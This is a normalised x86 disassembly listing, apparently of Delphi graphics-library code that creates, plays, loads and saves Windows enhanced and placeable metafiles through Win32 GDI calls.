lea eax [ ebp - 0x8 ]
call sub_4041d0
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_404378
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4259bd
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_425a28
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ esi + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ esi + 0x8 ] eax
mov ecx [ r-xdata ]
mov dx 0x3
mov eax esi
call sub_425ad4
mov ecx [ r-xdata ]
mov dx 0xe
mov eax esi
call sub_425ad4
mov ecx [ r-xdata ]
mov dx 0x2
mov eax esi
call sub_425ad4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_425aa8
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_40321c
mov eax [ esi + 0x8 ]
call sub_40321c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_425ad4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ecx
call sub_41a040
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_425b18
push [ fs : eax ]
mov [ fs : eax ] esp
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_41a040
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_425b7c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4031ec
call sub_425b3c
call sub_425b5c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_425bbc
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_40321c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a714
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_425bec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_403164
mov edx eax
mov eax [ ebx + 0xc ]
call sub_4033a8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41a824
pop esi
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub_425c20
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0xc ]
mov eax esi
mov edx edi
call sub_4033a8
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_40321c
xor eax eax
mov [ ebx + 0xc ] eax
mov dl 0x1
mov eax edi
call [ eax + 0x48 ]
mov esi eax
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_403430
mov [ esi + 0x10 ] eax
mov [ esi + 0x1c ] ebx
mov eax ebx
mov dx 0xfffc
call sub_403430
mov [ esi + 0x18 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403418
sub_425ccc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
xor eax eax
push ebp
push sub_425d5c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
call sub_40321c
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403418
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_403164
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_403430
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403430
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_425dac
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
xor edx edx
mov eax esi
call sub_425ccc
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov edx [ ebx + 0xc ]
mov eax esi
call sub_425ccc
jmp r-xdata
mov edx ebx
mov eax esi
call sub_41a740
mov edx ebx
mov eax esi
call sub_425ccc
jmp r-xdata
pop esi
pop ebx
retn
sub_425e08
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx edx
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_425b3c
mov ecx esi
mov edx ebx
call sub_4258a4
pop esi
pop ebx
pop ebp
retn 0x4
sub_425e2c
push ebx
mov ebx eax
cmp [ ebx + 0x12 ] 0x0
je r-xdata
cmp [ ebx + 0x18 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_425e50
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x22 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_425e78
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_425f7f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x44 ]
mov ecx 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
xor ecx ecx
mov cl [ ebp - 0x44 ]
lea edx [ ebp - 0x43 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
lea eax [ ebp - 0x48 ]
lea edx [ ebp - 0x44 ]
call sub_4041d0
mov edx [ ebp - 0x48 ]
mov eax [ rw-data ]
call sub_425938
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
call sub_40321c
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_425f01
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403418
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425f86
lea eax [ ebp - 0x48 ]
call sub_403f6c
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_403430
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403430
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_425f06
mov eax [ ebp - 0x4 ]
call sub_40321c
call sub_4039d0
call sub_403a24
mov eax [ ebx + 0xc ]
call sub_40321c
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403418
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425f86
lea eax [ ebp - 0x48 ]
call sub_403f6c
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_403430
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403430
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_425f90
push ebx
push esi
push edi
add esp 0xfffffec0
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
je r-xdata
mov [ esp ] 0x0
lea edx [ esp + 0x40 ]
mov eax [ edi ]
call sub_40316c
lea edx [ esp + 0x40 ]
mov eax esp
mov cl 0x3f
call sub_402b20
jmp r-xdata
add esp 0x140
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor ecx ecx
mov cl [ esp ]
inc ecx
mov edx esp
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
sub_425fec
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0xc ] 0x0
setne bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ebx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
cmp eax [ ebx + 0xc ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
sub_426068
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_425e78
mov eax [ ebp - 0x8 ]
push eax
push sub_425f90
push ebp
call sub_425fec
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4260e4
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
call sub_422128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40320c
test bl bl
jle r-xdata
push eax
call DeleteEnhMetaFile
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_426124
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_426194
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax edi
call sub_4265f4
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_42665c
mov eax [ ebp - 0x8 ]
push eax
mov ecx edi
xor edx edx
mov eax esi
call sub_4261bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42619b
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f90
retn
add esp 0xfffffff0
call sub_403540
sub_42619b
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_4261bc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
xor eax eax
push ebp
push sub_4263c8
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4237d4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x58 ] edi
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403540
xor edx edx
push ebp
push sub_4263ab
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_426770
test eax eax
jne r-xdata
push 0x0
call GetDC
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_426758
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_426758
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_426770
mov ecx eax
xor edx edx
xor eax eax
call sub_418d68
mov eax ebx
call sub_40422c
test eax eax
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
jne r-xdata
push 0x8
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
push eax
push 0x4
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
imul eax eax 0x64
push eax
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x58 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
call MulDiv
mov edx eax
mov eax edi
call sub_426dd0
push 0x4
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
imul edx eax 0x64
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_426dd0
jmp r-xdata
push ebx
push r-xdata
push esi
push r-xdata
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_4042ec
mov eax [ ebp - 0x20 ]
call sub_40442c
jmp r-xdata
mov eax esi
call sub_40422c
test eax eax
jle r-xdata
push 0xa
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
push eax
push 0x6
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
imul eax eax 0x64
push eax
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x58 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
call MulDiv
mov edx eax
mov eax edi
call sub_426d94
push 0x6
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
imul edx eax 0x64
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_426d94
jmp r-xdata
push eax
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
call CreateEnhMetaFileA
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_423e4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4263b2
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
call sub_42411c
retn
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
sub_4263cf
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_426403
inc [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
call sub_4035a8
mov ebx edx
mov edi eax
mov eax edi
call sub_423dcc
mov esi eax
xor edx edx
mov eax edi
call sub_423e4c
push esi
call CloseEnhMetaFile
mov edx eax
mov eax [ edi + 0x58 ]
call sub_426c90
mov edx ebx
and dl 0xfc
mov eax edi
call sub_423898
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403590
sub_426458
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_425344
mov [ esi + 0x2c ] 0x1
mov [ esi + 0x21 ] 0x1
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_4264a0
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_42764c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a714
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_4264d0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
test esi esi
je r-xdata
mov edi [ eax + 0x14 ]
call sub_42764c
mov edx esi
mov eax ebx
call sub_41a740
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebx + 0x28 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
mov edx [ eax + 0x28 ]
mov [ ebx + 0x28 ] edx
mov al [ eax + 0x2c ]
mov [ ebx + 0x2c ] al
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x28 ]
call sub_427648
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp edi eax
je r-xdata
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
retn
sub_426564
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
mov esi eax
xor ebp ebp
test esi esi
je r-xdata
mov eax [ esp ]
push esi
push edi
mov esi eax
lea edi [ esp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
dec [ esp + 0xc ]
dec [ esp + 0x10 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
mov eax edi
call sub_423dcc
push eax
call PlayEnhMetaFile
test esi esi
je r-xdata
push 0xffffffff
push esi
mov eax edi
call sub_423dcc
push eax
call SelectPalette
mov ebp eax
mov eax edi
call sub_423dcc
push eax
call RealizePalette
push 0xffffffff
push ebp
mov eax edi
call sub_423dcc
push eax
call SelectPalette
sub_4265f4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_403f6c
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileDescriptionA
mov edi eax
test edi edi
jle r-xdata
mov eax esi
mov edx edi
call sub_4045b8
mov eax [ esi ]
call sub_40442c
push eax
push edi
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileDescriptionA
mov eax [ esi ]
call sub_40442c
call sub_408890
mov edx eax
mov eax esi
call sub_4045b8
sub_42665c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax ebx
call sub_403f6c
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileDescriptionA
mov edi eax
test edi edi
jle r-xdata
mov eax ebx
mov edx edi
call sub_4045b8
mov eax [ ebx ]
call sub_40442c
push eax
push edi
mov eax [ esi + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileDescriptionA
mov eax [ ebx ]
call sub_40442c
call sub_408890
mov ecx eax
inc ecx
mov eax ebx
mov edx 0x1
call sub_4044cc
mov eax [ ebx ]
call sub_40442c
call sub_408890
mov edx eax
mov eax ebx
call sub_4045b8
sub_4266f4
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_4268cc
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x54 ] 0x64
push eax
mov eax [ esp + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
jmp r-xdata
mov eax [ ebx + 0x20 ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_426788
push ebx
push esi
push edi
add esp 0xfffffbfc
mov ebx eax
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax edi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x14 ]
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov esi eax
test esi esi
je r-xdata
cmp esi 0x100
jle r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x14 ]
call sub_422128
mov [ esp ] 0x300
mov [ esp + 0x2 ] si
lea eax [ esp + 0x4 ]
push eax
push esi
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov eax esp
push eax
call CreatePalette
mov edx [ ebx + 0x28 ]
mov [ edx + 0x14 ] eax
and esi 0xff
sub_426814
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_4268cc
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x50 ] 0x64
push eax
mov eax [ esp + 0x4c ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
jmp r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_426878
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_426e84
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_41bddc
pop ecx
sub ecx eax
mov edx esi
mov eax ebx
call sub_426a30
mov edx esi
mov eax ebx
call sub_426960
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
retn
sub_4268cc
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x28 ]
call sub_42764c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov esi eax
mov [ ebx + 0x28 ] esi
mov eax esi
call sub_427648
pop esi
pop ebx
retn
sub_4268f4
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
cmp [ esp ] 0x4
jg r-xdata
mov edx esi
mov eax ebx
call sub_426e84
test al al
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
mov ecx [ esp ]
sub ecx 0x4
mov edx esi
mov eax ebx
call sub_426a30
mov edx esi
mov eax ebx
call sub_426960
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edx
pop edi
pop esi
pop ebx
retn
sub_426960
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4268cc
lea edx [ ebp - 0x68 ]
mov ecx 0x64
mov eax edi
call sub_41c008
cmp [ ebp - 0x40 ] 0x464d4520
je r-xdata
mov eax [ ebp - 0x38 ]
call sub_40278c
mov [ ebp - 0x4 ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_426a20
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x68 ]
mov ecx 0x64
call sub_402988
mov ecx [ ebp - 0x38 ]
sub ecx 0x64
mov edx [ ebp - 0x4 ]
add edx 0x64
mov eax edi
call sub_41c008
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
call SetEnhMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_4240bc
mov [ ebx + 0x18 ] 0x0
mov eax [ ebp - 0x48 ]
sub eax [ ebp - 0x50 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ ebx + 0x10 ] eax
mov [ esi + 0x2c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426a27
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_4027ac
retn
call sub_4240bc
sub_426a30
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_4268cc
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x22 ] 0x9ac6cdd7
jne r-xdata
call sub_4240bc
lea eax [ ebp - 0x22 ]
call sub_424f0c
cmp ax [ ebp - 0xe ]
je r-xdata
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x18 ]
movsx edx [ ebp - 0x1c ]
sub eax edx
push eax
call MulDiv
mov [ ebx + 0xc ] eax
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x16 ]
movsx edx [ ebp - 0x1a ]
sub eax edx
push eax
call MulDiv
mov [ ebx + 0x10 ] eax
mov [ ebp - 0x32 ] 0x8
xor eax eax
mov [ ebp - 0x2e ] eax
xor eax eax
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
mov [ ebp - 0x14 ] 0x60
sub [ ebp - 0x8 ] 0x16
mov eax [ ebp - 0x8 ]
call sub_40278c
mov [ ebp - 0xc ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_426b9f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ esi + 0x28 ]
mov dx [ ebp - 0x14 ]
mov [ eax + 0x18 ] dx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
lea eax [ ebp - 0x96 ]
push eax
push 0x64
mov eax [ ebx + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov [ ebp - 0x32 ] 0x8
mov eax [ ebp - 0x76 ]
mov [ ebp - 0x2e ] eax
mov eax [ ebp - 0x72 ]
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
mov eax [ ebx + 0x8 ]
